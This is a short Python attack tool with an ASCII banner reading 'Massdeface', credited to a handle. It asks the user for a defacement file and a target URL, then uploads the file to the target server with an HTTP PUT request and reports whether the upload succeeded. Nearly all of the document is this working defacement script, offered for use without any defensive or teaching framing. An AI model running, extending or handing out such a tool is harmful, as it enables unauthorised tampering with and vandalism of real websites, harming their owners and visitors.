# -*- coding: utf-8 -*-

try:
    import requests
    import os.path
    import sys
except ImportError:
    exit("Install requests and try again ...")

banner = """
888b     d888                                 888           .d888                          
8888b   d8888                                 888          d88P"                           
88888b.d88888                                 888          888                             
888Y88888P888  8888b.  .d8888b  .d8888b   .d88888  .d88b.  888888 8888b.   .d8888b .d88b.  
888 Y888P 888     "88b 88K      88K      d88" 888 d8P  Y8b 888       "88b d88P"   d8P  Y8b 
888  Y8P  888 .d888888 "Y8888b. "Y8888b. 888  888 88888888 888   .d888888 888     88888888 
888   "   888 888  888      X88      X88 Y88b 888 Y8b.     888   888  888 Y88b.   Y8b.     
888       888 "Y888888  88888P'  88888P'  "Y88888  "Y8888  888   "Y888888  "Y8888P "Y8888  
                                                                                           
                                                                                           
                                                                                by-69b1t
             Coded By :- 69b1t
 Github   :-www.github.com/69b1t
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(prompt):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(prompt)
    else:
        ipt = raw_input(prompt)

    return str(ipt)

def aox(script, target_url):
    op = open(script, "r").read()
    try:
        s = requests.Session()
        print("Uploading file to %s" % (target_url))
        try:
            if not target_url.startswith("http://"):
                target_url = "http://" + target_url
            req = s.put(target_url + "/" + script, data=op)
            if req.status_code < 200 or req.status_code >= 250:
                print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (target_url, script))
            else:
                print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (target_url, script))

        except requests.exceptions.RequestException:
            print("An error occurred during the request to %s" % (target_url))
        except KeyboardInterrupt:
            print()
            exit()

    except IOError:
        print("Error: Could not open or read the file:", script)

def main(__bn__):
    print(__bn__)
    try:
        a = x("Enter your script deface name: ")
        if not os.path.isfile(a):
            print("File '%s' not found" % (a))
            exit()
        
        target_url = x("Enter the target URL (e.g., http://example.com): ")

        aox(a, target_url)
    
    except KeyboardInterrupt:
        print()
        exit()

if __name__ == "__main__":
    main(banner)
